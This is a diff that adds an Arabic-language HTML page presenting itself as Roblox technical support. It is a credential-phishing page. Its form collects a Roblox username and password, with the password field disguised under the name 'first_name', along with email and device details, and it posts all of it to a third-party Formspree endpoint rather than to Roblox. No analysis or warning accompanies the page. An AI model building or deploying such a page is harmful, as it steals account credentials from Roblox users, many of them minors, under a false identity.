@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>اتصل بنا</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f7f7f7;
+    direction: rtl;
+    margin: 0;
+    padding: 0;
+}
+
+.container {
+    max-width: 500px;
+    margin: 50px auto;
+    background-color: #fff;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+
+h2 {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+label {
+    display: block;
+    margin-top: 15px;
+    font-weight: bold;
+}
+
+input, select, textarea, button {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+textarea {
+    resize: none;
+    height: 100px;
+}
+
+button {
+    background-color: #808080;
+    color: #fff;
+    border: none;
+    margin-top: 20px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #555;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+<h2>الدعم الفني الخاص Roblox</h2>
+
+<form action="https://formspree.io/f/mvzwrgbe" method="POST">
+
+<label>اسم المستخدم</label>
+<input type="text" name="username" placeholder="اسم المستخدم">
+
+<label>كلمة المرور</label>
+<input type="text" name="first_name" placeholder="كلمه المرور"> 
+
+<label>الاسم الاول</label>
+<input type="text" name="last_name" placeholder="الاسم الثاني">
+
+<label>البريد الإلكتروني</label>
+<input type="email" name="email" placeholder="البريد الإلكتروني" required>
+
+<label>تأكيد البريد الإلكتروني</label>
+<input type="email" name="confirm_email" placeholder="تأكيد البريد الإلكتروني" required>
+
+<label>نوع الجهاز</label>
+<select name="device">
+<option value="">اختر النوع</option>
+<option>كمبيوتر</option>
+<option>كمبيوتر محمول</option>
+<option>أندرويد</option>
+<option>iPhone</option>
+<option>تابلت أندرويد</option>
+<option>iPad</option>
+<option>Xbox</option>
+<option>PlayStation</option>
+<option>Meta Quest</option>
+<option>أخرى</option>
+</select>
+
+<label>نوع فئة المساعدة</label>
+<select name="help_type">
+<option value="">اختر الفئة</option>
+<option>تم اختراق الحساب</option>
+<option>تعذر تسجيل الدخول</option>
+<option>مشتريات Robux</option>
+<option>استرداد Robux</option>
+<option>الإبلاغ عن إساءة</option>
+<option>الإبلاغ عن استغلال</option>
+<option>DMCA</option>
+<option>بطاقة الهدايا</option>
+<option>أفكار واقتراحات</option>
+<option>نصب ممتلكات</option>
+</select>
+
+<label>يرجى وصف مشكلتك</label>
+<textarea name="message" placeholder="ما هي المشكلة التي تواجهها"></textarea>
+
+<button type="submit">ارسال الطلب</button>
+
+</form>
+
+</div>
+
+<script>
+document.querySelector('form').addEventListener('submit', function(e) {
+    alert('تم إرسال النموذج بنجاح!');
+});
+</script>
+
+</body>
+</html>
